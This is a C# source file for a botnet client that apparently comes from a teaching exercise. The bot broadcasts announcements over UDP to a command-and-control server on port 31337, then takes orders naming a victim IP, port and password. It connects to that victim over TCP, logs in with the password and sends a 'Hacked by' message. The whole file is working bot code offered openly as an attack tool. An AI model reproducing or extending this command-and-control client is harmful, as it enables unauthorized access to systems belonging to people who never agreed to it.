using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

using System.Net.Sockets;
using System.Net;

namespace Bot_Computer
{
    class Bot
    {
        public int Port { get; set; }
        private UdpClient udpListener; // the UDP
        private const int cncPort = 31337; // the port of C&C server
        private IPEndPoint dest;

        public Bot()
        {
            Random random = new Random();
            Port = random.Next(1025, 65535);

            StartServer();
        }

        // init the server on the localhost ip and the random port
        public void StartServer()
        {
            try
            {
                // establish UDP connection and listen on local ip address and the random port
                // using this UDP to send bot_announcements
                dest = new IPEndPoint(IPAddress.Any, 0);
                udpListener = new UdpClient(Port);
                Console.WriteLine("Bot is listening on port " + Port);

                Thread tAnnouncement, tListen;
                
                while (true)
                {
                    tListen = new Thread(ListenAndAttack);
                    tListen.Name = "Attacker";
                    tListen.Start();
                    tAnnouncement = new Thread(SendAnnouncement);
                    tAnnouncement.Name = "announcement";
                    tAnnouncement.Start();

                    Thread.Sleep(10000); // 10 seconds
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace.ToString());
                Console.WriteLine(e.Message);
            }
        }

        // accept UDP messages from the CnC. then establish TCP with victim
        private void ListenAndAttack()
        {
            //udpListener.Connect(dest);
            while (true)
            {
                byte[] activationMsg = udpListener.Receive(ref dest); // blocking!!
                ConnectVictim_TCP(Encoding.UTF8.GetString(activationMsg));
                //udpListener.Close();
            }
        }

        // sends bot announcements over UDP to CnC
        private void SendAnnouncement()
        {
            UdpClient conn = new UdpClient();
            //conn.Connect("localhost", cncPort);
            conn.Connect("255.255.255.255", cncPort);
            byte[] sendData = Encoding.UTF8.GetBytes(Convert.ToString(Port));
            conn.Send(sendData, sendData.Length);
            conn.Close();
        }

        private void ConnectVictim_TCP(string msg) 
        {
            string[] msgSplit = msg.Split(',');
            string ip = msgSplit[0];
            int port = Convert.ToInt32(msgSplit[1]);
            string password = msgSplit[2];
            string name = msgSplit[3];

            // connect to the victim client
            try
            {
                // create the TCP connection with the victim!
                TcpClient client = new TcpClient(ip, port);

                // now recieve the enter password msg
                byte[] passMsg = new byte[60];
                client.Client.Receive(passMsg);
                Console.WriteLine(Encoding.UTF8.GetString(passMsg));
                byte[] victim_password = Encoding.UTF8.GetBytes(password + "ENTER \r\n");
                // send the password for verification
                client.Client.Send(victim_password);
                Console.WriteLine(password);

                // send hacking message
                byte[] hackMsg = Encoding.UTF8.GetBytes("Hacked by " + name + "\r\n");
                client.Client.Send(hackMsg);

                client.Close();
            }
            catch (SocketException)
            {
                // do nothing
            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace.ToString());
                Console.WriteLine(e.Message);
            }
        }
    }
}